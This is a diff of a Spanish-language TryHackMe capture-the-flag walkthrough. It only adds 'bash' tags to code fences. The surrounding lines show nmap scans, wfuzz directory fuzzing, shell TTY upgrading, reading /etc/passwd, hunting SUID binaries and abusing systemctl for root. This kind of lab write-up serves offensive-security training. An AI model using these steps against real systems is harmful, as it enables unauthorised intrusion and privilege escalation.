@@ -32,13 +32,13 @@ Todas estas preguntas son fáciles de responder si realizamos un buen escaneo co
 
 Para determinar que puertos están abiertos podemos realizar lo siguiente:
   
-```
+```bash
 nmap -p- --open -T5 -v -n <dirección IP>
 ```
  
 Y en caso de que el escaneo tarde demasiado en completar, tenemos esta otra alternativa:
   
-``` 
+```bash
 sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn <dirección IP>
 ```
 
@@ -56,7 +56,7 @@ A continuación se explican los parámetros utilizados en el escaneo de puertos 
 
 Para determinar la versión y servicios que corren bajo estos puertos podemos realizar lo siguiente:
 
-```  
+```bash 
 nmap -sC -sV -p 21,22,139,445,3128,3333 <dirección IP>
 ```
   
@@ -83,7 +83,7 @@ sudo apt install wfuzz
 
 Para pasar a la fase de explotación, lo que nos solicita la plataforma es encontrar una ruta potencial de la página web, que nos permita una subida de archivos, para lo cual debemos de _fuzzear_ la página web, para ello realizaremos lo siguiente:
 
-```
+```bash
 wfuzz -c -L -t 400 --hc 404 --hh 33014 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt http://dirección IP:3333/FUZZ 2> /dev/null
 ```
 
@@ -174,7 +174,7 @@ Ambas opciones, nos conseguirán una _consola_ dentro de la máquina víctima.
 
 Es importante aclarar que la _consola_ que acabamos de conseguir, no es nada interactiva, esto quiere decir que si quisieramos limpiar la _consola_ utilizando `Ctrl + L`, no pasará nada, así mismo si quisieramos desplazarnos utilizando las `flechas` del teclado, no nos será posible hacerlo, para ello deberemos de realizar el respectivo tratamiento de la `TTY`, para lo cual haremos lo siguiente:
 
-```
+```bash
 script /dev/null -c bash
 
 Ctrl + Z
@@ -212,7 +212,7 @@ Aunque también podriamos filtrar del archivo `/etc/passwd`, a través de expres
 
 Esto sería bastante fácil, ya que todas, o casi todas las _shells_ terminan en `sh`, de modo que con ambas formas podemos determinar que usuarios existen a nivel de sistema.
 
-```
+```bash
 cat /etc/passwd | grep "sh$"
 ```
 
@@ -220,7 +220,7 @@ cat /etc/passwd | grep "sh$"
 
 Una vez hemos listado los usuarios del sistema, podemos pasar a buscar en que ruta se encuentra la flag del usuario con bajos privilegios, para ello podemos hacer lo siguiente:
 
-```
+```bash
 find . -name user.txt 2> /dev/null
 ```
 
@@ -232,11 +232,11 @@ Para realizar esta última fase, la misma plataforma de _TryHackMe_ nos sugiere 
 
 Para listar todos aquellos binarios con permisos `SUID` asignados, tenemos varias opciones, no obstante, estas son las que yo utilizo:
 
-```
+```bash
 find / -perm -4000 -type f -exec ls -la {} 2>/dev/null \;
 ```
 
-```
+```bash
 find / -uid 0 -perm -4000 -type f 2>/dev/null
 ```
 
@@ -252,7 +252,7 @@ Como podemos ver, podemos abusar de este binario fácilmente, además de que nos
 
 Para conseguir la última flag haremos lo siguiente:
 
-```
+```bash
 TF=$(mktemp).service
 echo '[Service]
 Type=oneshot
@@ -273,7 +273,7 @@ Una vez hemos abusado del binario `/bin/systemctl`, haremos lo siguiente:
 
 Una vez siendo root, podemos pasar a buscar su respectiva flag, esto lo podemos hacer así:
 
-```
+```bash
 find . -name root.txt
 ```
  
